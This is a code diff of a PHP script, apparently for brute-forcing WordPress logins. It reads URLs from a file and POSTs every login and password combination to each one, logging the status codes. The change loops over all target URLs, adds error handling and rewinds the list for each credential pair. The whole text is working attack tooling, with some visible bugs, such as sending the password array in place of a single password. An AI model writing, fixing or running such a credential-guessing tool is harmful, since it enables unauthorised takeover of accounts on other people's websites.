@@ -13,27 +13,32 @@
 
     foreach ($logins as $login) {
         foreach ($passwords as $password) {
-            $verified = fgets($verifieds);
-            $url      = explode(';', $verified)[0];
 
-//            if (($login == "{login}" || $password == "{login}") && isset(explode(";", $verified)[1])) {
-            if (isset(explode(";", $verified)[1])) {
-                $username  = explode(';', $verified)[1];
-                $login     == '{login}' ? : $username = $login;
-                $passwords == '{login}' ? : $username = $passwords;
-            } elseif (!isset(explode(";", $verified)[1]) && ($login == "{login}" || $password == "{login}")) {
-                continue;
+            while (false != $verified = fgets($verifieds)) {
+                $url = explode(';', $verified)[0];
+
+                if (isset(explode(";", $verified)[1])) {
+                    $username  = explode(';', $verified)[1];
+                    $login     == '{login}' ? : $username = $login;
+                    $passwords == '{login}' ? : $username = $passwords;
+                } elseif (!isset(explode(";", $verified)[1]) && ($login == "{login}" || $password == "{login}")) {
+                    echo "login: {$login} | password: {$password} url: {$url} | status code: continue" . PHP_EOL;
+                    continue;
+                }
+
+                try {
+                    $response = $client->request('POST', $url, [
+                        'form_params' => [
+                            'log' => $login,
+                            'pwd' => $passwords
+                        ]
+                    ]);
+                } catch (Exception $e) {
+                    echo "login: {$login} | password: {$password} url: {$url} | status code: Что то пошло не так" . PHP_EOL;
+                }
+
+                echo "login: {$login} | password: {$password} url: {$url} | status code: " . $response->getStatusCode() . PHP_EOL;
             }
-
-
-
-            $response = $client->request('POST', $url, [
-                'form_params' => [
-                    'log' => $login,
-                    'pwd' => $passwords
-                ]
-            ]);
-
-            echo "login: {$login} | password: {$password} url: {$url} | status code: " . $response->getStatusCode() . PHP_EOL;
+            rewind($verifieds);
         }
     }
